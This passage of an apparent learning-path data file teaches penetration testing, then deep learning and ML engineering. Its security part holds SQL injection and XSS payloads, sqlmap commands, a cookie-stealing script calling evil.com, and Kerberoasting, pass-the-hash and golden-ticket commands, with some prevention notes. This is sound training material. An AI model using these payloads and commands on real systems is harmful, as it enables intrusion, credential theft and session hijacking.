### TCP Three-Way Handshake
\`\`\`
Client              Server
   |    SYN          |
   |---------------->|
   |    SYN-ACK      |
   |<----------------|
   |    ACK          |
   |---------------->|
   |   [Connected]   |
\`\`\`

### HTTP Request Structure
\`\`\`http
GET /path HTTP/1.1
Host: example.com
Cookie: session=abc123
Authorization: Bearer token
\`\`\`

## Attack Surfaces by Layer
| Layer | Attack Examples |
|-------|-----------------|
| 7 | SQL injection, XSS, command injection |
| 4 | SYN flood, port scanning |
| 3 | IP spoofing, routing attacks |
| 2 | ARP spoofing, MAC flooding |`
					}
				]
			},
			{
				name: 'Web Application Security',
				description: 'OWASP Top 10 and beyond',
				tasks: [
					{
						title: 'Exploit SQL injection vulnerabilities',
						description: 'UNION, blind, time-based injection techniques',
						details: `## SQL Injection Types

### 1. Classic UNION-based
\`\`\`sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (error = 2 columns)

-- Extract data
' UNION SELECT username, password FROM users--
' UNION SELECT NULL, table_name FROM information_schema.tables--
\`\`\`

### 2. Blind Boolean-based
\`\`\`sql
' AND 1=1--  (True - normal response)
' AND 1=2--  (False - different response)
' AND SUBSTRING(username,1,1)='a'--
\`\`\`

### 3. Time-based Blind
\`\`\`sql
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--
\`\`\`

## Automation with sqlmap
\`\`\`bash
sqlmap -u "http://target.com/page?id=1"
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
\`\`\`

## Prevention
\`\`\`python
# WRONG - vulnerable
query = f"SELECT * FROM users WHERE id = {user_input}"

# RIGHT - parameterized query
cursor.execute("SELECT * FROM users WHERE id = ?", (user_input,))
\`\`\``
					},
					{
						title: 'Master XSS (Cross-Site Scripting)',
						description: 'Reflected, stored, and DOM-based XSS',
						details: `## XSS Types

### Reflected XSS
User input immediately reflected in response:
\`\`\`html
https://site.com/search?q=<script>alert(1)</script>
\`\`\`

### Stored XSS
Payload stored in database, executed when page loads:
\`\`\`html
<!-- Comment field -->
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
\`\`\`

### DOM-based XSS
Client-side JavaScript processes attacker input:
\`\`\`javascript
// Vulnerable code
document.write(location.hash.substring(1));
// Attack: https://site.com#<script>alert(1)</script>
\`\`\`

## Bypass Techniques
\`\`\`html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>

<!-- Encoding -->
<script>eval(atob('YWxlcnQoMSk='))</script>
\`\`\`

## Prevention
\`\`\`javascript
// Escape output
function escapeHtml(str) {
    return str.replace(/[&<>"']/g, char => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#39;'
    })[char]);
}
\`\`\``
					}
				]
			},
			{
				name: 'Active Directory Attacks',
				description: 'Domain attacks and lateral movement',
				tasks: [
					{
						title: 'Understand AD architecture and authentication',
						description: 'Domains, forests, Kerberos, NTLM',
						details: `## AD Architecture

### Components
- **Domains**: Logical grouping of objects
- **Forests**: Collection of domains
- **Trusts**: Relationships between domains
- **OUs**: Organizational Units for management
- **GPOs**: Group Policy Objects

## Kerberos Authentication Flow
\`\`\`
1. User → KDC: AS-REQ (username + encrypted timestamp)
2. KDC → User: AS-REP (TGT encrypted with krbtgt hash)
3. User → KDC: TGS-REQ (TGT + SPN)
4. KDC → User: TGS-REP (Service Ticket)
5. User → Service: AP-REQ (Service Ticket)
\`\`\`

## Common Misconfigurations
- Kerberoastable accounts (SPNs on user accounts)
- Unconstrained delegation
- Weak ACLs
- AS-REP roastable accounts

## Key Commands
\`\`\`powershell
# Create Kerberoastable user
setspn -A MSSQLSvc/db01.lab.local:1433 svc_sql

# Create AS-REP roastable user
Set-ADAccountControl -Identity "user" -DoesNotRequirePreAuth $true
\`\`\``
					},
					{
						title: 'Execute Kerberoasting attack',
						description: 'Extract service tickets and crack offline',
						details: `## Kerberoasting

Request service tickets for accounts with SPNs, crack offline.

### Using Impacket
\`\`\`bash
GetUserSPNs.py -request -dc-ip 10.0.0.10 lab.local/user:password
\`\`\`

### Using Rubeus
\`\`\`powershell
.\\Rubeus.exe kerberoast /outfile:hashes.txt
\`\`\`

### Crack with Hashcat
\`\`\`bash
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule
\`\`\`

## Prevention
- Use long, random passwords for service accounts
- Use Group Managed Service Accounts (gMSA)
- Monitor for TGS requests to unusual SPNs`
					},
					{
						title: 'Perform Pass-the-Hash and Pass-the-Ticket',
						description: 'Lateral movement without knowing plaintext passwords',
						details: `## Pass-the-Hash

Use NTLM hash directly without cracking:

### Using Impacket
\`\`\`bash
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.0.0.10

wmiexec.py -hashes :HASH domain/user@target
\`\`\`

### Using CrackMapExec
\`\`\`bash
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH
\`\`\`

## Pass-the-Ticket

Use Kerberos tickets for authentication:

### Extract tickets
\`\`\`powershell
# With Mimikatz
sekurlsa::tickets /export

# With Rubeus
.\\Rubeus.exe dump
\`\`\`

### Use ticket
\`\`\`bash
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass domain/user@target
\`\`\`

## Golden Ticket
Forge TGT with krbtgt hash:
\`\`\`powershell
mimikatz# kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
\`\`\``
					}
				]
			}
		]
	},
	// PATH 4: Learn Deep Learning Without Courses
	{
		name: 'Learn Deep Learning Without Courses',
		description: 'Self-directed deep learning education through papers, code, and hands-on implementation.',
		language: 'Python',
		color: 'emerald',
		skills: 'paper reading, mathematical foundations, PyTorch, experiment design, scientific thinking',
		startHint: 'Start with 3Blue1Brown neural network videos, then implement a basic MLP',
		difficulty: 'intermediate',
		estimatedWeeks: 12,
		schedule: `## 12-Week Self-Study Schedule

### Weeks 1-2: Mathematical Foundations
| Week | Focus | Resources |
|------|-------|-----------|
| W1 | Linear Algebra | 3Blue1Brown Essence of Linear Algebra |
| W1 | Calculus | Chain rule, gradients, computation graphs |
| W2 | Probability | Distributions, Bayes theorem |
| W2 | Implementation | Backprop from scratch in NumPy |

### Weeks 3-4: Neural Network Fundamentals
| Week | Focus | Implementation |
|------|-------|----------------|
| W3 | Perceptrons | Implement perceptron algorithm |
| W3 | MLPs | Multi-layer network for MNIST |
| W4 | Loss Functions | MSE, cross-entropy |
| W4 | BatchNorm | Read paper, implement from scratch |

### Weeks 5-7: Convolutional Networks
| Week | Focus | Paper |
|------|-------|-------|
| W5 | LeNet-5 | LeCun 1998 |
| W6 | AlexNet | Krizhevsky 2012 |
| W6 | VGG | Simonyan 2014 |
| W7 | ResNet | He 2015 - implement skip connections |

### Weeks 8-9: Sequence Models
| Week | Focus | Implementation |
|------|-------|----------------|
| W8 | RNN/LSTM | Vanilla RNN, then LSTM |
| W8 | Language Model | Character-level generation |
| W9 | Attention | "Attention Is All You Need" paper |
| W9 | Implementation | Multi-head attention from scratch |

### Weeks 10-12: Modern Techniques
| Week | Focus | Activities |
|------|-------|------------|
| W10 | Transfer Learning | Fine-tuning strategies |
| W11 | Paper Reading | Summarize 5 papers in your area |
| W12 | Reproduction | Reproduce results from a paper |

### Daily Commitment: 2-3 hours reading + coding`,
		modules: [
			{
				name: 'Mathematical Foundations',
				description: 'Build the math intuition needed for deep learning',
				tasks: [
					{
						title: 'Review linear algebra fundamentals',
						description: 'Vectors, matrices, broadcasting - watch 3Blue1Brown',
						details: `## Essential Linear Algebra

### What You Need to Know
| Concept | Why It Matters | Depth Needed |
|---------|----------------|--------------|
| Matrix multiplication | Forward pass | Must be intuitive |
| Transpose | Backprop, attention | Basic understanding |
| Broadcasting | Efficient operations | PyTorch specifics |
| Eigenvalues | PCA, gradients | Conceptual only |

### 3Blue1Brown Playlist
Watch these in order:
1. **Vectors** - Episode 1
2. **Linear combinations** - Episode 2
3. **Matrix multiplication** - Episode 4
4. **Inverse matrices** - Episode 7

### Hands-on Practice
\`\`\`python
import numpy as np

# Matrix multiplication
A = np.array([[1, 2], [3, 4]])
B = np.array([[5, 6], [7, 8]])
print(A @ B)

# What happens with shapes?
x = np.random.randn(32, 768)  # batch of embeddings
W = np.random.randn(768, 3072)  # weight matrix
output = x @ W  # (32, 3072)

# Broadcasting
biases = np.random.randn(3072)
output_with_bias = output + biases  # broadcasts!
\`\`\`

### Key Insight
You don't need to derive anything by hand. But you need to:
- Know what shape tensors should be
- Understand why operations fail
- Debug dimension mismatches`
					},
					{
						title: 'Understand calculus for backpropagation',
						description: 'Chain rule, gradients - the one thing you need',
						details: `## Calculus for Deep Learning

### The One Thing You Need: Chain Rule
\`\`\`
If y = f(g(x)), then dy/dx = dy/dg · dg/dx
\`\`\`

This is literally all of backpropagation.

### Intuitive Understanding
\`\`\`python
# Forward pass
x = 3.0
a = x * 2        # a = 6
b = a + 1        # b = 7
c = b ** 2       # c = 49

# Backward pass (chain rule)
dc_db = 2 * b    # = 14
db_da = 1        # = 1
da_dx = 2        # = 2

# Full gradient
dc_dx = dc_db * db_da * da_dx  # = 28
\`\`\`

### PyTorch Does This For You
\`\`\`python
import torch

x = torch.tensor(3.0, requires_grad=True)
a = x * 2
b = a + 1
c = b ** 2

c.backward()
print(x.grad)  # tensor(28.)
\`\`\`

### Gradient Intuition
- **Gradient = direction of steepest increase**
- **Negative gradient = direction to minimize loss**`
					},
					{
						title: 'Implement backpropagation from scratch in NumPy',
						description: 'Build a simple neural network without frameworks',
						details: `## Backprop from Scratch

\`\`\`python
import numpy as np

class MLP:
    def __init__(self, input_dim, hidden_dim, output_dim):
        self.W1 = np.random.randn(input_dim, hidden_dim) * np.sqrt(2/input_dim)
        self.b1 = np.zeros(hidden_dim)
        self.W2 = np.random.randn(hidden_dim, output_dim) * np.sqrt(2/hidden_dim)
        self.b2 = np.zeros(output_dim)

    def relu(self, x):
        return np.maximum(0, x)

    def relu_derivative(self, x):
        return (x > 0).astype(float)

    def softmax(self, x):
        exp_x = np.exp(x - np.max(x, axis=-1, keepdims=True))
        return exp_x / exp_x.sum(axis=-1, keepdims=True)

    def forward(self, X):
        self.X = X
        self.z1 = X @ self.W1 + self.b1
        self.a1 = self.relu(self.z1)
        self.z2 = self.a1 @ self.W2 + self.b2
        self.probs = self.softmax(self.z2)
        return self.probs

    def backward(self, y_true):
        batch_size = y_true.shape[0]
        dz2 = self.probs - y_true

        self.dW2 = self.a1.T @ dz2 / batch_size
        self.db2 = dz2.mean(axis=0)

        da1 = dz2 @ self.W2.T
        dz1 = da1 * self.relu_derivative(self.z1)

        self.dW1 = self.X.T @ dz1 / batch_size
        self.db1 = dz1.mean(axis=0)

    def update(self, lr=0.01):
        self.W1 -= lr * self.dW1
        self.b1 -= lr * self.db1
        self.W2 -= lr * self.dW2
        self.b2 -= lr * self.db2
\`\`\`

## Key Insights
1. Gradients flow backward through the same operations
2. Chain rule connects each layer's gradients
3. Shapes must match - transpose where needed`
					}
				]
			},
			{
				name: 'Core Implementation',
				description: 'Build neural networks from scratch',
				tasks: [
					{
						title: 'Clone nanoGPT and study every line',
						description: "Karpathy's minimal GPT implementation",
						details: `## nanoGPT Study Guide

\`\`\`bash
git clone https://github.com/karpathy/nanoGPT
cd nanoGPT

# Prepare data
python data/shakespeare_char/prepare.py

# Train
python train.py config/train_shakespeare_char.py

# Generate
python sample.py --out_dir=out-shakespeare-char
\`\`\`

## Files to Study
| File | Lines | What You Learn |
|------|-------|----------------|
| model.py | ~300 | Complete transformer |
| train.py | ~200 | Training loop |
| config/ | ~50 | Hyperparameters |

## How to Study
1. Add print statements for shapes
2. Modify something, see what breaks
3. Reimplement from scratch without looking

## Key Functions in model.py
- \`CausalSelfAttention\` - The attention mechanism
- \`MLP\` - Feed-forward network
- \`Block\` - One transformer layer
- \`GPT\` - Full model`
					},
					{
						title: 'Implement MNIST classifier in PyTorch',
						description: 'Multi-layer networks, activation functions, softmax',
						details: `## MNIST Classification

\`\`\`python
import torch
import torch.nn as nn
import torch.nn.functional as F
from torchvision import datasets, transforms
from torch.utils.data import DataLoader

# Data
transform = transforms.Compose([
    transforms.ToTensor(),
    transforms.Normalize((0.1307,), (0.3081,))
])

train_data = datasets.MNIST('./data', train=True, download=True, transform=transform)
test_data = datasets.MNIST('./data', train=False, transform=transform)

train_loader = DataLoader(train_data, batch_size=64, shuffle=True)
test_loader = DataLoader(test_data, batch_size=1000)

# Model
class MLP(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc1 = nn.Linear(784, 256)
        self.fc2 = nn.Linear(256, 128)
        self.fc3 = nn.Linear(128, 10)
        self.dropout = nn.Dropout(0.2)

    def forward(self, x):
        x = x.view(-1, 784)
        x = F.relu(self.fc1(x))
        x = self.dropout(x)
        x = F.relu(self.fc2(x))
        x = self.dropout(x)
        return self.fc3(x)

# Train
model = MLP()
optimizer = torch.optim.Adam(model.parameters(), lr=1e-3)

for epoch in range(10):
    model.train()
    for data, target in train_loader:
        optimizer.zero_grad()
        loss = F.cross_entropy(model(data), target)
        loss.backward()
        optimizer.step()
\`\`\`

## Target
Reach >98% accuracy on MNIST test set.`
					}
				]
			},
			{
				name: 'Resources & Practice',
				description: 'Free resources that actually work',
				tasks: [
					{
						title: "Watch Karpathy's Neural Networks: Zero to Hero",
						description: 'Code along with the entire series',
						details: `## Karpathy YouTube Playlist

| Video | Length | What You Learn |
|-------|--------|----------------|
| Let's build GPT from scratch | 2 hrs | Complete transformer |
| Let's build the GPT Tokenizer | 2 hrs | BPE tokenization |
| Building makemore Part 1 | 1 hr | Bigram models |
| Building makemore Part 2 | 1 hr | MLP language model |
| Building makemore Part 3 | 1 hr | BatchNorm, activations |
| Building makemore Part 4 | 1 hr | Backprop internals |
| Building makemore Part 5 | 1 hr | WaveNet architecture |

## How to Use
1. Code along - don't just watch
2. Pause and predict what comes next
3. Modify the code, break things
4. Reimplement without looking

## Other Resources
- **3Blue1Brown**: Math intuition
- **Jay Alammar**: Visual transformer explanations
- **labml.ai**: Papers with line-by-line code`
					},
					{
						title: 'Read and implement key papers',
						description: 'Attention Is All You Need, BERT, GPT, LoRA',
						details: `## Papers Worth Reading

### Foundational
| Paper | Year | Why Read It |
|-------|------|-------------|
| Attention Is All You Need | 2017 | The transformer |
| BERT | 2018 | Bidirectional pretraining |
| GPT-2 | 2019 | Decoder-only LLMs |
| GPT-3 | 2020 | Scaling laws |

### Modern Essentials
| Paper | Topic | Why It Matters |
|-------|-------|----------------|
| LLaMA | Architecture | Modern baseline |
| LoRA | Fine-tuning | Most common adaptation |
| FlashAttention | Efficiency | Why inference is fast |

## How to Read Papers
\`\`\`
1. Read abstract and conclusion first
2. Look at figures and tables
3. Skim the method section
4. If still interested, read fully
5. Find/write implementation
6. Now you actually understand it
\`\`\`

**Don't**: Read papers cover-to-cover
**Do**: Jump around, implement to understand`
					}
				]
			}
		]
	},
	// PATH 5: Deep Learning Guide Part 2
	{
		name: 'Deep Learning Advanced Topics',
		description: 'Advanced deep learning: generative models, multi-modal AI, production systems.',
		language: 'Python',
		color: 'amber',
		skills: 'generative models, multi-modal fusion, model compression, curriculum learning, deployment',
		startHint: 'Start with the dialogue generation model for character AI',
		difficulty: 'advanced',
		estimatedWeeks: 8,
		schedule: `## 8-Week Advanced Schedule

### Weeks 1-3: Generative Models
| Week | Focus | Implementation |
|------|-------|----------------|
| W1 | Dialogue Generation | Fine-tune model for character dialogue |
| W2 | Scene Description | Image captioning and scene generation |
| W3 | Narrative Generation | Story continuation with context |

### Weeks 4-5: Multi-Modal AI
| Week | Focus | Implementation |
|------|-------|----------------|
| W4 | Vision-Language | CLIP-style contrastive learning |
| W5 | Multi-Modal Fusion | Combine text, image, audio embeddings |

### Weeks 6-8: Production Systems
| Week | Focus | Activities |
|------|-------|------------|
| W6 | Model Compression | Quantization, pruning, distillation |
| W7 | Deployment | ONNX export, serving infrastructure |
| W8 | Optimization | Latency optimization, batching |

### Daily Commitment: 3-4 hours`,
		modules: [
			{
				name: 'Generative Models',
				description: 'Build dialogue and scene generation systems',
				tasks: [
					{
						title: 'Implement character dialogue generator',
						description: 'Condition generation on character traits and emotion',
						details: `## Movie Dialogue Generator

\`\`\`python
class MovieDialogueGenerator(nn.Module):
    """
    Generate dialogue conditioned on:
    - Character personality/traits
    - Scene context
    - Emotional state
    """
    def __init__(self, vocab_size, d_model=768, num_characters=100):
        super().__init__()

        self.token_emb = nn.Embedding(vocab_size, d_model)
        self.pos_emb = nn.Embedding(512, d_model)
        self.character_emb = nn.Embedding(num_characters, d_model)
        self.emotion_emb = nn.Embedding(10, d_model)

        decoder_layer = nn.TransformerDecoderLayer(
            d_model=d_model, nhead=12, dim_feedforward=d_model*4, batch_first=True
        )
        self.decoder = nn.TransformerDecoder(decoder_layer, num_layers=8)
        self.output = nn.Linear(d_model, vocab_size)

    def forward(self, input_ids, character_id, emotion_id, context_emb=None):
        B, T = input_ids.shape

        x = self.token_emb(input_ids) + self.pos_emb(torch.arange(T, device=input_ids.device))
        x = x + self.character_emb(character_id).unsqueeze(1)
        x = x + self.emotion_emb(emotion_id).unsqueeze(1)

        if context_emb is None:
            context_emb = torch.zeros(B, 1, x.size(-1), device=x.device)

        mask = torch.triu(torch.ones(T, T, device=x.device), diagonal=1).bool()
        x = self.decoder(x, context_emb, tgt_mask=mask)
        return self.output(x)
\`\`\`

## Use Cases
- Character AI chatbots
- Interactive fiction
- Game NPC dialogue`
					},
					{
						title: 'Build multi-modal movie understanding system',
						description: 'Fuse visual, audio, and text for scene analysis',
						details: `## Multi-Modal Fusion

\`\`\`python
class MultiModalFusion(nn.Module):
    def __init__(self, visual_dim=768, audio_dim=256, text_dim=768, fusion_dim=512):
        super().__init__()

        self.visual_proj = nn.Linear(visual_dim, fusion_dim)
        self.audio_proj = nn.Linear(audio_dim, fusion_dim)
        self.text_proj = nn.Linear(text_dim, fusion_dim)

        # Cross-modal attention
        self.v_to_a = nn.MultiheadAttention(fusion_dim, 8, batch_first=True)
        self.v_to_t = nn.MultiheadAttention(fusion_dim, 8, batch_first=True)
        self.a_to_v = nn.MultiheadAttention(fusion_dim, 8, batch_first=True)

        self.fusion_mlp = nn.Sequential(
            nn.Linear(fusion_dim * 3, fusion_dim * 2),
            nn.ReLU(),
            nn.Dropout(0.1),
            nn.Linear(fusion_dim * 2, fusion_dim)
        )

    def forward(self, visual, audio, text=None):
        v = self.visual_proj(visual)
        a = self.audio_proj(audio)
        t = self.text_proj(text) if text is not None else torch.zeros_like(v)

        # Cross-modal attention
        v_attended = v + self.v_to_a(v, a, a)[0] + self.v_to_t(v, t, t)[0]
        a_attended = a + self.a_to_v(a, v, v)[0]

        combined = torch.cat([v_attended, a_attended, t], dim=-1)
        return self.fusion_mlp(combined)
\`\`\`

## Applications
- Scene classification
- Emotional arc detection
- Key moment identification`
					}
				]
			},
			{
				name: 'Production Systems',
				description: 'Model compression and deployment',
				tasks: [
					{
						title: 'Implement knowledge distillation',
						description: 'Train smaller model to mimic larger teacher',
						details: `## Knowledge Distillation

Train smaller student to mimic larger teacher:
\`\`\`
Loss = α × KL(soft_student || soft_teacher) + (1-α) × CE(student, labels)
\`\`\`

\`\`\`python
def knowledge_distillation(teacher, student, train_loader, temperature=4.0, alpha=0.5):
    teacher.eval()
    student.train()
    optimizer = torch.optim.Adam(student.parameters(), lr=1e-4)

    for inputs, labels in train_loader:
        with torch.no_grad():
            teacher_logits = teacher(inputs)
            soft_teacher = F.softmax(teacher_logits / temperature, dim=-1)

        student_logits = student(inputs)
        soft_student = F.log_softmax(student_logits / temperature, dim=-1)

        # Distillation loss
        distill_loss = F.kl_div(soft_student, soft_teacher, reduction='batchmean')
        distill_loss *= temperature ** 2

        # Hard label loss
        hard_loss = F.cross_entropy(student_logits, labels)

        loss = alpha * distill_loss + (1 - alpha) * hard_loss

        optimizer.zero_grad()
        loss.backward()
        optimizer.step()
\`\`\`

## Benefits
- 10x smaller models
- Faster inference
- Minimal accuracy loss`
					},
					{
						title: 'Apply quantization techniques',
						description: 'Dynamic, static, and quantization-aware training',
						details: `## Quantization Methods

### Dynamic Quantization
\`\`\`python
model_int8 = torch.quantization.quantize_dynamic(
    model, {nn.Linear}, dtype=torch.qint8
)
\`\`\`

### Static Quantization
\`\`\`python
model.qconfig = torch.quantization.get_default_qconfig('fbgemm')
prepared = torch.quantization.prepare(model)

# Calibrate
for inputs, _ in calibration_loader:
    prepared(inputs)

quantized = torch.quantization.convert(prepared)
\`\`\`

### Quantization-Aware Training
\`\`\`python
model.qconfig = torch.quantization.get_default_qat_qconfig('fbgemm')
prepared = torch.quantization.prepare_qat(model)

# Train with fake quantization
for epoch in range(epochs):
    for inputs, labels in train_loader:
        outputs = prepared(inputs)
        loss = F.cross_entropy(outputs, labels)
        loss.backward()
        optimizer.step()

quantized = torch.quantization.convert(prepared)
\`\`\`

## Memory Savings
| Precision | Memory | Speed |
|-----------|--------|-------|
| FP32 | 100% | 1x |
| FP16 | 50% | 2x |
| INT8 | 25% | 3x |`
					}
				]
			}
		]
	},
	// PATH 6: ML Pipeline Complete Guide
	{
		name: 'ML Pipeline Complete Guide',
		description: 'From raw data to deployed model - the complete ML engineering workflow.',
		language: 'Python',
		color: 'blue',
		skills: 'data collection, cleaning, feature engineering, training, evaluation, deployment, MLOps',
		startHint: 'Start by building a data collection script for your domain',
		difficulty: 'intermediate',
		estimatedWeeks: 6,
		schedule: `## 6-Week MLOps Schedule

### Week 1: Data Collection & Cleaning
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Collection | Build scrapers/API integrations |
| Wed-Thu | Cleaning | Handle missing values, outliers |
| Fri | Validation | Data quality checks |

### Week 2: Feature Engineering
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Numerical | Scaling, transforms, binning |
| Wed-Thu | Categorical | Encoding, embeddings |
| Fri | Feature Store | Organize reusable features |

### Week 3: Model Development
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon | Experiment Tracking | Set up MLflow/W&B |
| Tue-Wed | Baseline Models | Train multiple model types |
| Thu-Fri | Hyperparameter Tuning | Optuna/Ray Tune |

### Week 4: Evaluation & Iteration
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Error Analysis | Confusion matrices, calibration |
| Wed-Thu | Cross-Validation | Proper splits, stratification |
| Fri | Model Selection | Choose best model |

### Week 5: Deployment
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon | Export | ONNX/TorchScript packaging |
| Tue-Wed | API | FastAPI serving endpoint |
| Thu-Fri | Docker | Containerize application |

### Week 6: Monitoring
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Logging | Prediction logging, metrics |
| Wed-Thu | Drift Detection | Monitor data drift |
| Fri | Alerting | Set up alerts for degradation |

### Daily Commitment: 2-3 hours`,
		modules: [
			{
				name: 'Data Collection',
				description: 'Gather data from various sources',
				tasks: [
					{
						title: 'Build a web scraping pipeline',
						description: 'Rate limiting, caching, error handling',
						details: `## Data Collection Script

\`\`\`python
import requests
import time
import hashlib
from pathlib import Path

class DataCollector:
    def __init__(self, output_dir: str, rate_limit: float = 1.0):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.rate_limit = rate_limit
        self.last_request = 0

    def _rate_limit(self):
        elapsed = time.time() - self.last_request
        if elapsed < self.rate_limit:
            time.sleep(self.rate_limit - elapsed)
        self.last_request = time.time()

    def _get_cache_path(self, url: str) -> Path:
        url_hash = hashlib.md5(url.encode()).hexdigest()
        return self.output_dir / f"{url_hash}.json"

    def fetch(self, url: str, use_cache: bool = True) -> dict:
        cache_path = self._get_cache_path(url)

        if use_cache and cache_path.exists():
            with open(cache_path) as f:
                return json.load(f)

        self._rate_limit()

        response = requests.get(url, headers={'User-Agent': 'DataCollector/1.0'})
        response.raise_for_status()
        data = response.json()

        with open(cache_path, 'w') as f:
            json.dump(data, f)

        return data
\`\`\`

## Time Spent at Each Stage
| Stage | Actual Time | Most Think |
|-------|-------------|------------|
| Data Collection | 20% | 5% |
| Data Cleaning | 30% | 5% |
| Model Training | 10% | 60% |

**80% of ML is data work.**`
					},
					{
						title: 'Set up Hugging Face dataset loading',
						description: 'Load and process common datasets',
						details: `## Loading Datasets

\`\`\`python
from datasets import load_dataset

class HuggingFaceDatasetLoader:
    def __init__(self, cache_dir: str = "data/hf_cache"):
        self.cache_dir = cache_dir

    def load_text_dataset(self, name: str):
        datasets_config = {
            "wikipedia": ("wikipedia", {"name": "20220301.en"}),
            "openwebtext": ("openwebtext", {}),
            "c4": ("c4", {"name": "en"}),
            "pile": ("EleutherAI/pile", {}),
        }

        dataset_name, config = datasets_config[name]
        return load_dataset(dataset_name, cache_dir=self.cache_dir, **config)
\`\`\`

## Common Datasets
| Dataset | Size | Use Case |
|---------|------|----------|
| Wikipedia | 20GB | General text |
| C4 | 750GB | Web text |
| The Pile | 800GB | Diverse text |
| OpenWebText | 38GB | Reddit links |`
					}
				]
			},
			{
				name: 'Data Cleaning',
				description: 'Clean and deduplicate data',
				tasks: [
					{
						title: 'Implement text cleaning pipeline',
						description: 'Fix encoding, remove HTML, normalize unicode',
						details: `## Text Cleaning Pipeline

\`\`\`python
import re
import unicodedata
import ftfy

class TextCleaner:
    def __init__(self):
        self.url_pattern = re.compile(r'http[s]?://[^\\s]+')
        self.email_pattern = re.compile(r'[\\w\\.-]+@[\\w\\.-]+\\.\\w+')
        self.html_pattern = re.compile(r'<[^>]+>')

    def fix_encoding(self, text: str) -> str:
        return ftfy.fix_text(text)

    def normalize_unicode(self, text: str) -> str:
        return unicodedata.normalize('NFKC', text)

    def remove_html(self, text: str) -> str:
        return self.html_pattern.sub(' ', text)

    def remove_urls(self, text: str) -> str:
        return self.url_pattern.sub(' ', text)

    def clean(self, text: str) -> str:
        if not text:
            return ""

        text = self.fix_encoding(text)
        text = self.normalize_unicode(text)
        text = self.remove_html(text)
        text = self.remove_urls(text)
        text = ' '.join(text.split())  # Normalize whitespace

        return text
\`\`\`

## Cleaning Steps Order
1. Fix encoding (mojibake)
2. Normalize unicode
3. Remove HTML/URLs
4. Normalize whitespace`
					},
					{
						title: 'Build deduplication system',
						description: 'Exact, MinHash, and semantic deduplication',
						details: `## Deduplication Methods

### Exact Deduplication
\`\`\`python
def exact_dedup(documents):
    seen = set()
    unique = []
    for doc in documents:
        doc_hash = hashlib.md5(doc.encode()).hexdigest()
        if doc_hash not in seen:
            seen.add(doc_hash)
            unique.append(doc)
    return unique
\`\`\`

### MinHash LSH
\`\`\`python
from datasketch import MinHash, MinHashLSH

def minhash_dedup(documents, threshold=0.8, num_perm=128):
    lsh = MinHashLSH(threshold=threshold, num_perm=num_perm)

    for i, doc in enumerate(documents):
        mh = MinHash(num_perm=num_perm)
        for word in doc.lower().split():
            mh.update(word.encode('utf-8'))
        lsh.insert(str(i), mh)

    # Find duplicates...
\`\`\`

### Semantic Deduplication
\`\`\`python
from sentence_transformers import SentenceTransformer
from sklearn.metrics.pairwise import cosine_similarity

def embedding_dedup(documents, threshold=0.9):
    model = SentenceTransformer('all-MiniLM-L6-v2')
    embeddings = model.encode(documents)
    sim_matrix = cosine_similarity(embeddings)
    # Find pairs above threshold...
\`\`\``
					}
				]
			},
			{
				name: 'Training & Deployment',
				description: 'Train and deploy models',
				tasks: [
					{
						title: 'Build training pipeline with mixed precision',
						description: 'Gradient accumulation, learning rate schedules',
						details: `## Training Pipeline

\`\`\`python
from torch.cuda.amp import autocast, GradScaler

class Trainer:
    def __init__(self, model, train_dataset, config):
        self.model = model
        self.scaler = GradScaler() if config.fp16 else None

        # Optimizer with weight decay
        decay_params = []
        no_decay_params = []
        for name, param in model.named_parameters():
            if 'bias' in name or 'norm' in name:
                no_decay_params.append(param)
            else:
                decay_params.append(param)

        self.optimizer = torch.optim.AdamW([
            {'params': decay_params, 'weight_decay': config.weight_decay},
            {'params': no_decay_params, 'weight_decay': 0.0}
        ], lr=config.lr, betas=(0.9, 0.95))

    def train_step(self, batch):
        with autocast(enabled=self.config.fp16):
            outputs = self.model(batch['input_ids'])
            loss = F.cross_entropy(outputs, batch['labels'])

        if self.scaler:
            self.scaler.scale(loss).backward()
            self.scaler.unscale_(self.optimizer)
            torch.nn.utils.clip_grad_norm_(self.model.parameters(), 1.0)
            self.scaler.step(self.optimizer)
            self.scaler.update()
        else:
            loss.backward()
            self.optimizer.step()

        return loss.item()
\`\`\`

## Key Hyperparameters
| Parameter | Typical Values |
|-----------|----------------|
| Learning Rate | 1e-4 to 6e-4 |
| Batch Size | 512K-4M tokens |
| Weight Decay | 0.01 to 0.1 |
| Gradient Clipping | 1.0 |`
					},
					{
						title: 'Deploy model with vLLM',
						description: 'High-performance inference server',
						details: `## vLLM Inference Server

\`\`\`python
from vllm import LLM, SamplingParams
from fastapi import FastAPI
from pydantic import BaseModel
import uvicorn

app = FastAPI()

llm = LLM(
    model="meta-llama/Llama-2-7b-chat-hf",
    tensor_parallel_size=1,
    gpu_memory_utilization=0.9,
    max_model_len=4096
)

class GenerateRequest(BaseModel):
    prompt: str
    max_tokens: int = 256
    temperature: float = 0.7

@app.post("/generate")
async def generate(request: GenerateRequest):
    sampling_params = SamplingParams(
        max_tokens=request.max_tokens,
        temperature=request.temperature
    )

    outputs = llm.generate([request.prompt], sampling_params)

    return {
        "text": outputs[0].outputs[0].text,
        "tokens": len(outputs[0].outputs[0].token_ids)
    }

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
\`\`\`

